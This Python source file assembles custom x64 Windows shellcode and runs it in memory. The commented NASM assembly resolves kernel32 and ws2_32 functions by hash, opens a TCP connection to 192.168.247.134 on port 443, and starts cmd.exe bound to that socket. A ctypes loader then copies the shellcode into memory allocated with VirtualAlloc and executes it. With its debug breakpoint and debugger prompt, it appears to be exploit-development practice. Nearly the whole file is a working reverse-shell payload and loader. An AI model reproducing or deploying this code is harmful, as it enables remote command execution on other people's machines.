import ctypes
import platform

# Generic Imports
import socket
import struct
import sys
from struct import pack

from colorama import Back, Fore, Style
from modules.ipAndPort_module import hexIP, hexPort

# Custom modules
# from modules.keystone_module import keystone_asm
from modules.msfvenom_module import generatePayload
from modules.nasm_module import nasm_asm
from modules.rorHash_module import hashFuncName

# from modules.syscallFinder_module import get_syscall_number    # cant use on <python3.8


def ret_asm() -> str:

    asm = f"""
    START:
        int3                                        ; Remove when not debugging  
    
    SETUP_STACK:
        mov rbp, rsp                                ; Initialize stack frame
        sub rsp, 0x610                              ; Allocate 1552 bytes of local stack space
    
    FIND_KERNEL32:
        xor rcx, rcx                                ; rcx = 0
        mov rsi, gs:[rcx + 0x60]                    ; rsi = PEB (Process Environment Block)
        mov rsi, [rsi + 0x18]                       ; rsi = PEB_LDR_DATA (loader data structure)
        mov rsi, [rsi + 0x30]                       ; rsi = InInitializationOrderModuleList (first module entry)

    CHECK_NEXT_MODULE:
        mov rbx, [rsi + 0x30]                       ; rbx = base address of current module
        mov rdi, [rsi + 0x50]                       ; rdi = pointer to module name (wide string)
        mov rsi, [rsi]                              ; rsi = next module in linked list (FLINK)
        cmp [rdi + 12*2], cx                        ; Check for null terminator at offset 24 (12th wide char)
        jne CHECK_NEXT_MODULE                       ; If not kernel32, loop to next module


    FIND_FUNCTION_SHORTEN:
        jmp FIND_FUNCTION_SHORTEN_BNC               ; Skip over the actual function code
    
    FIND_FUNCTION_RET:
        pop rsi                                     ; Pop return address from call
        mov [rbp + 0x04], rsi                       ; Store function address pointer on stack
        jmp RESOLVE_SYMBOLS_TERMINATEPROCESS        ; Jump to resolve kernel32 symbols

    FIND_FUNCTION_SHORTEN_BNC:
        call FIND_FUNCTION_RET                      ; Call to set up function pointer, placed here to generate negative offset


    ; ===== FIND_FUNCTION: Resolves function addresses via Export Address Table (EAT) =====
    FIND_FUNCTION:
        push rax                                    ; Save general purpose registers
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        push rbp
        mov rax, [rbx + 0x3C]                       ; rax = offset to IMAGE_NT_HEADERS (PE signature location)
        mov rdi, [rbx + rax + 0x78]                 ; rdi = Export Table RVA (relative virtual address)
        add rdi, rbx                                ; rdi = Export Table VMA (absolute virtual memory address)
        mov rcx, [rdi + 0x18]                       ; rcx = number of exported functions
        mov rax, [rdi + 0x20]                       ; rax = AddressOfNames RVA (pointer table RVA)
        add rax, rbx                                ; rax = AddressOfNames VMA
        mov [rbp - 4], rax                          ; Store on stack for later use in loop

    SEARCH_LOOP:
        jrcxz FIND_FUNCTION_DONE                    ; If rcx is 0, all functions checked, exit
        dec rcx                                     ; rcx-- (decrement function counter)
        mov rax, [rbp - 4]                          ; rax = AddressOfNames VMA
        mov rsi, [rax + rcx*4]                      ; rsi = function name RVA (4 bytes per entry)
        add rsi, rbx                                ; rsi = function name VMA (string location)

    COMPUTE_HASH:
        xor rax, rax                                ; rax = 0 (hash accumulator)
        cqo                                         ; rdx = 0 (extend rax sign to rdx)
        cld                                         ; Clear direction flag (ensures LODSB increments rsi)

    HASH_LOOP:
        lodsb                                       ; AL = byte at [rsi], rsi++ (load function name byte)
        test al, al                                 ; Check if AL is null terminator (end of string)
        jz HASH_DONE                                ; If null byte found, hash computation complete
        ror rdx, 0xd                                ; rdx = rdx rotated right 13 bits (ROR hash)
        add rdx, rax                                ; rdx += AL (accumulate hash)
        jmp HASH_LOOP                               ; Continue hashing next byte
    HASH_DONE:

    COMPARE_HASH_TO_FUNCTION:
        cmp rdx, [rsp + 0x40]                       ; Compare computed hash (rdx) with target hash (passed on stack)
        jnz SEARCH_LOOP                             ; If hashes don't match, check next function
        mov rdx, [rdi + 0x24]                       ; rdx = AddressOfNameOrdinals RVA
        add rdx, rbx                                ; rdx = AddressOfNameOrdinals VMA
        mov cx, [rdx + rcx*2]                       ; CX = ordinal (2 bytes per entry)
        mov rdx, [rdi + 0x1C]                       ; rdx = AddressOfFunctions RVA
        add rdx, rbx                                ; rdx = AddressOfFunctions VMA
        mov rax, [rdx + rcx*4]                      ; rax = function RVA (4 bytes per entry)
        add rax, rbx                                ; rax = function VMA (absolute address)
        mov [rsp], rax                              ; Store function address on stack for pop restore
    
    FIND_FUNCTION_DONE:
        pop rbp                                     ; Restore general purpose registers
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        ret                                         ; Return to caller

    ; ===== RESOLVE_SYMBOLS_KERNEL32: Push RoR hashes of Functions to load from kernel32.dll =====
    RESOLVE_SYMBOLS_TERMINATEPROCESS:
        mov edi, {hashFuncName("TerminateProcess")}
        push rdi
        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [rbp + 0x10], rax                       ; Store TerminateProcess address in [rbp+0x10]
    
    RESOLVE_SYMBOLS_LOADLIBRARYA:
        mov edi, {hashFuncName("LoadLibraryA")}
        push rdi
        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [rbp + 0x14], rax                       ; Store LoadLibraryA address in [rbp+0x14]
    
    RESOLVE_SYMBOLS_CREATEPROCESSA:
        mov edi, {hashFuncName("CreateProcessA")}
        push rdi
        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [rbp + 0x18], rax                       ; Store CreateProcessA address in [rbp+0x18]
    
    ; ===== LOAD_WS2_32: Load string to the stack in little endian (\x77\x73\x32\x5f \x33\x32\x2e\x64 \x6c\x6c)  =====
    LOAD_WS2_32:
        xor rax, rax                                ; rax = 0
        mov ax, 0x6c6c                              ; AX = 'll' (part of "ws2_32.dll")
        push rax                                    ; Push 'll\0\0'
        push 0x642e3233                             ; Push 'd.23'
        push 0x5f327377                             ; Push '_2sw' 
        push rsp                                    ; Push pointer to "ws2_32.dll" string
        call [rbp + 0x14]                           ; Call LoadLibraryA("ws2_32.dll") 

    ; ===== RESOLVE_SYMBOLS_WS2_32: Push RoR hashes of Functions to load from ws2_32.dll =====
    RESOLVE_SYMBOLS_WSASTARTUP:
        mov rbx, rax                                ; rbx = base address of ws2_32.dll
        mov edi, {hashFuncName("WSAStartup")}
        push rdi
        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [rbp + 0x1C], rax                       ; Store WSAStartup address in [rbp+0x1C]

    RESOLVE_SYMBOLS_WSASOCKETA:
        mov edi, {hashFuncName("WSASocketA")}
        push rdi
        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [rbp + 0x20], rax                       ; Store WSASocketA address in [rbp+0x20]
    
    RESOLVE_SYMBOLS_WSACONNECT:
        mov edi, {hashFuncName("WSAConnect")}
        push rdi
        call [rbp + 0x04]                           ; Call FIND_FUNCTION to resolve address
        mov [rbp + 0x24], rax                       ; Store WSASConnect address in [rbp+0x24]

    
    ; ===== CALL_WSASTARTUP: Setup args and call WSAStartup =====
    CALL_WSASTARTUP:
        mov rax, rsp                                ; rax = rsp
        mov cx, 0x590                               ; CX = 0x590
        sub rax, rcx                               ; rax -= rcx to avoid overwriting stack
        push rax                                    ; Push pointer to WSADATA structure
        xor rax, rax                                ; rax = 0
        mov ax, 0x0202                              ; AX = MAKEWORD(2,2)
        push rax                                    ; Push wVersionRequested = MAKEWORD(2,2)
        call [rbp + 0x1C]                           ; Call WSAStartup(MAKEWORD(2,2), &WSADATA)

    ; ===== CALL_WSASOCKETA: Setup args and call WSASocketA =====
    ; WSASocketA(AF, Type, Protocol, lpProtocolInfo, g, dwFlags)
    ; AF = 2 (AF_INET)
    ; Type = 1 (SOCK_STREAM)
    ; Protocol = 6 (IPPROTO_TCP)
    ; lpProtocolInfo = NULL <- Requires a pointer to WSAPROTOCOL_INFO struct, not needed here
    ; g = NULL <- Pointer to group id, not needed here
    ; dwFlags = 0 <- No special flags, can be [e.g., WSA_FLAG_OVERLAPPED]


    CALL_WSASOCKETA:
        xor rax, rax                                ; rax = 0
        push rax                                    ; Push dwFlags = 0
        push rax                                    ; Push g = 0
        push rax                                    ; Push lpProtocolInfo = 0
        mov al, 0x06                                ; rax = 6 (AL, IPPROTO_TCP)
        push rax                                    ; Push Protocol
        sub al, 0x05                                ; rax = 1 (Type)
        push rax                                    ; Push Type
        inc rax                                     ; rax = 2 (AF)
        push rax                                    ; Push AF
        call [rbp + 0x20]                           ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, 0, 0, 0)


    ; ===== CALL_WSACONNECT: Setup args and call WSAConnect =====
    ; WSAConnect(s, *name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
    ; lpCallerData, lpCalleeData, lpSQOS, lpGQOS = NULL <- REASON:: Legacy|NotUsed
    ; *name = pointer to sockaddr structure
    ; UCHAR s_b1;
    ; UCHAR s_b2;
    ; UCHAR s_b3;
    ; UCHAR s_b4;
    ; USHORT s_w1;
    ; USHORT s_w2;
    ; ULONG S_addr;

    CALL_WSACONNECT:
        mov rsi, rax                                ; rsi SOCKET DESCRIPTOR
        xor rax, rax                                ; rax = 0
        push rax                                    ; Push sin_zero[]
        push rax                                    ; Push sin_zero[]

        ; PUSH IP AND PORT
        mov edi, {hexIP("192.168.247.134")}
        push rdi
        mov ax, {hexPort(443)}                  
        
        shl rax,0x10                                ; Left shift PORT to high word
        add ax, 0x02                                ; AF_INET (sin_family)
        push rax                                    ; Push sin_family and sin_port
        push rsp                                    ; Push pointer to sockaddr_in structure
        pop rdi                                     ; rdi = pointer to sockaddr_in
        xor rax, rax                                ; rax = 0
        push rax                                    ; Push lpGQOS
        push rax                                    ; Push lpSQOS
        push rax                                    ; Push lpCallerData
        push rax                                    ; Push lpCalleeData
        add al, 0x10                                ; rax = 16 (size of sockaddr_in)
        push rax                                    ; Push iSockaddrLength
        push rdi                                    ; Push lpSockaddr
        push rsi                                    ; Push s (socket descriptor)
        call [rbp + 0x24]                           ; Call WSAConnect

    ; ===== CREATE_PROCESS: Setup args and call CreateProcessA to spawn cmd.exe =====
    ; CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles
    ;                dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
    ; lpApplicationName = cmd.exe
    ; lpCommandLine = NULL <- can be NULL to use application name
    ; lpProcessAttributes = NULL <- default security, defines inheritance
    ; lpThreadAttributes = NULL <- default security, defines inheritance + ACL
    ; bInheritHandles = TRUE <- inherit handles from parent process
    ; dwCreationFlags = 0 <- default behavior
    ; lpEnvironment = NULL <- use parent process environment
    ; lpCurrentDirectory = NULL <- use parent process current directory
    ; lpStartupInfo = pointer to STARTUPINFO struct
    ; lpProcessInformation = pointer to PROCESS_INFORMATION struct

    ; struct STARTUPINFO [
    ;     DWORD   cb;                   ; Size of the structure in bytes. Default: sizeof(STARTUPINFO) = 0x44
    ;     LPSTR   lpReserved;           ; Reserved, must be NULL
    ;     LPSTR   lpDesktop;            ; Desktop name, set to NULL
    ;     LPSTR   lpTitle;              ; Title for the new process window, set to NULL
    ;     DWORD   dwX;                  ; X position of the window, set to NULL
    ;     DWORD   dwY;                  ; Y position of the window, set to NULL
    ;     DWORD   dwXSize;              ; Width of the window, set to NULL
    ;     DWORD   dwYSize;              ; Height of the window, set to NULL
    ;     DWORD   dwXCountChars;        ; Screen buffer width, set to NULL
    ;     DWORD   dwYCountChars;        ; Screen buffer height, set to NULL
    ;     DWORD   dwFillAttribute;      ; Screen buffer fill attribute, set to NULL
    ;     DWORD   dwFlags;              ; Startup options, set to STARTF_USESTDHANDLES(0x100), needed to rrdirect std handles    
    ;     WORD    wShowWindow;          ; Window show state, must be NULL to disable cmd window  
    ;     WORD    cbReserved2;          ; Reserved, must be NULL
    ;     LPBYTE  lpReserved2;          ; Reserved, must be NULL
    ;     HANDLE  hStdInput;            ; Standard input handle
    ;     HANDLE  hStdOutput;           ; Standard output handle
    ;     HANDLE  hStdError;            ; Standard error handle
    ; ]
    ; For cmd.exe, cb = 0x44, dwFlags = 0x100, rest are all null
    
    CREATE_STARTUPINFOA:
        push rsi                        ; Push hSTDError, rsi currently holds socketDescriptor
        push rsi                        ; Push hSTDOutput
        push rsi                        ; Push hSTDInput
        xor rax, rax                    ; rax = 0
        push rax                        ; Push lpReserved2
        push rax                        ; Push cbReserved2 + wShowWindow
        xor rcx, rcx                    ; rcx = 0
        mov al, 0x80                    ; rax = 0x80
        mov cx, 0x80                    ; CX =  0x80 
        add rax, rcx                    ; rax = 0x100 (dwFlags = STARTF_USESTDHANDLES)
        push rax                        ; Push dwFlags
        xor rax, rax                    ; rax = 0
        push rax                        ; Push dwFillAttribute
        push rax                        ; Push dwYCountChars
        push rax                        ; Push dwXCountChars
        push rax                        ; Push dwYSize
        push rax                        ; Push dwXSize
        push rax                        ; Push dwY
        push rax                        ; Push dwX
        push rax                        ; Push lpTitle
        push rax                        ; Push lpDesktop
        push rax                        ; Push lpReserved
        mov rax, 0x44                   ; rax = 0x44 (size of STARTUPINFO)
        push rax                        ; Push cb
        push rsp                        ; Push pointer to STARTUPINFO structure
        pop rdi                         ; rdi = pointer to STARTUPINFO

    ;cmd.exe string creation
    CREATE_CMD_STR:
        mov rax, 0xFF9A879B                 ; rax = 'exe.'
        neg rax
        push rax                            ; Push 'exe.'
        mov rax, 0x2e646d63                 ; rax = 'cmd.'
        push rax                            ; Push 'cmd.'
        push rsp                            ; Push pointer to "cmd.exe" string
        pop rbx                             ; rbx = pointer to "cmd.exe"

    ; everything is ready, call createProcessA
    CALL_CREATEPROCESSA:
        mov rax, rsp                    ; rax = rsp
        xor rcx, rcx                    ; rcx = 0
        mov cx, 0x390                   ; CX = 0x390
        sub rax, rcx                    ; rax -= rcx to avoid overwriting stack later
        push rax                        ; Push pointer to PROCESS_INFORMATION structure
        push rdi                        ; Push pointer to STARTUPINFO structure
        xor rax, rax                    ; rax = 0
        push rax                        ; Push lpCurrentDirectory = NULL
        push rax                        ; Push lpEnvironment = NULL
        push rax                        ; Push dwCreationFlags = 0
        inc rax                         ; rax = 1
        push rax                        ; Push bInheritHandles = TRUE
        dec rax                         ; rax = 0
        push rax                        ; Push lpThreadAttributes = NULL
        push rax                        ; Push lpProcessAttributes = NULL
        push rbx                        ; Push pointer to "cmd.exe" string
        push rax                        ; Push lpApplicationName = NULL
        call [rbp + 0x18]               ; Call CreateProcessA("cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &STARTUPINFO, &PROCESS_INFORMATION)
        


        
    ; ===== EXIT_PROCESS: With everything ready in the stack we can proceed w our func calls here =====
    EXIT_PROCESS:
        xor rcx, rcx                                ; rcx = 0
        push rcx                                    ; Push 0 as exit code parameter
        push 0xFFFFFFFF                             ; Push -1 (current process handle constant)
        call [rbp+0x10]                             ; Call TerminateProcess(hProcess=-1, uExitCode=0)

    """

    return asm


# Keystone
def get_shellcode():
    asm = ret_asm()

    shellcode = b""
    # shellcode += keystone_asm(CODE=asm, debug=True)
    shellcode += nasm_asm(CODE=asm, arch=64, debug=True)

    # keystone_asm returns bytes, so we can return it as a bytesarray
    shellcode = bytearray(shellcode)
    return shellcode


def stuff_ctypes():
    # idk where to put this but ik this comes after shellcode
    shellcode = get_shellcode()

    # load addr of kernel32.dll
    kernel32 = ctypes.windll.kernel32
    if kernel32:
        # print the ptr obj
        print(f"{Fore.LIGHTBLUE_EX}\t o Found {kernel32}{Style.RESET_ALL}")

    # ==================== allocate buffer ====================
    # setup VirtAlloc args
    # arg1: LPVOID lpAddress -> 0x0 because we want the OS to decide
    # arg2: SIZE_T dwSize -> size of shellcode
    # arg3: DWORD flAllocationType -> Default: 0x3000 = MEM_COMMIT(0x1000) | MEM_RESERVE(0x2000)
    # arg4: DWORD flProtect -> Default: 0x40 = PAGE_EXECUTE_READWRITE

    # Ensure correct types for args to VirtualAlloc
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_uint32,
        ctypes.c_uint32,
    ]

    # Ensure correct return type for VirtualAlloc
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    # call VirtAlloc
    ptr = kernel32.VirtualAlloc(0x0, len(shellcode), 0x3000, 0x40)
    if ptr == 0:
        raise Exception("VirtualAlloc failed")
    else:
        print(
            f"{Fore.LIGHTBLUE_EX}\t o Allocated memory at address: {hex(ptr)}{Style.RESET_ALL}"
        )

    # ==================== copy buffer ====================
    # since shellcode var from get_shellcode() is 'bytes' (read-only),
    # use a copy-backed ctypes buffer
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    if not buf:
        raise Exception("Buffer creation failed")
    else:
        # print buffer obj
        print(f"{Fore.LIGHTBLUE_EX}\t o Created buffer object:{Style.RESET_ALL}")
        print(f"{Fore.LIGHTBLUE_EX}\t\t{buf}{Style.RESET_ALL}")

    # ensure correct types for RtlMoveMemory
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
    ]
    # ensure correct return type for RtlMoveMemory
    kernel32.RtlMoveMemory.restype = None

    # copy shellcode into allocated memory
    kernel32.RtlMoveMemory(ptr, buf, len(shellcode))

    # Get current PID
    current_pid = kernel32.GetCurrentProcessId()

    input(
        f"{Fore.LIGHTYELLOW_EX}\n\n\t o Please Attach debugger to python.exe({current_pid}), press enter to continue...\n\n{Style.RESET_ALL}"
    )

    # ==================== create thread ====================
    # setup CreateThread args
    # arg1: LPSECURITY_ATTRIBUTES lpThreadAttributes -> NULL
    # arg2: SIZE_T dwStackSize -> 0 (default)
    # arg3: LPTHREAD_START_ROUTINE lpStartAddress -> ptr to shellcode
    # arg4: LPVOID lpParameter -> NULL
    # arg5: DWORD dwCreationFlags -> 0 (run immrdiately)
    # arg6: LPDWORD lpThreadId -> NULL

    # Ensure correct types for args to CreateThread
    kernel32.CreateThread.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_uint32,
        ctypes.POINTER(ctypes.c_uint32),
    ]

    # Ensure correct return type for CreateThread
    kernel32.CreateThread.restype = ctypes.c_void_p

    # call CreateThread
    thread_id = ctypes.c_uint32(0)
    thread_handle = kernel32.CreateThread(
        None, 0, ptr, None, 0, ctypes.byref(thread_id)
    )
    if thread_handle == 0:
        raise Exception("CreateThread failed")
    else:
        print(
            f"{Fore.LIGHTBLUE_EX}\t o Created thread with ID: {thread_id.value}{Style.RESET_ALL}"
        )

    # ==================== wait for thread ====================
    # setup WaitForSingleObject args
    # arg1: HANDLE hHandle -> thread_handle
    # arg2: DWORD dwMilliseconds -> 0xFFFFFFFF (INFINITE)

    # Ensure correct types for args to WaitForSingleObject
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
    # Ensure correct return type for WaitForSingleObject
    kernel32.WaitForSingleObject.restype = ctypes.c_uint32

    # call WaitForSingleObject
    result = kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
    if result != 0:
        raise Exception("WaitForSingleObject failed")
    else:
        print(f"{Fore.LIGHTBLUE_EX}Thread has finished execution.{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        plat = platform.architecture()
        print(
            f"{Fore.LIGHTWHITE_EX}[+] Python Architecture: {plat[0]}{Style.RESET_ALL}"
        )
        print(f"{Fore.LIGHTWHITE_EX}[+] Platform: {plat[1]}{Style.RESET_ALL}")
        stuff = stuff_ctypes()

        print(f"{Fore.LIGHTRED_EX}[+]{Fore.LIGHTYELLOW_EX} Done!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}{e}")
    except KeyboardInterrupt:
        print(f"{Fore.LIGHTRED_EX}\n\n[!] Caught CTRL+C \nExiting...{Style.RESET_ALL}")
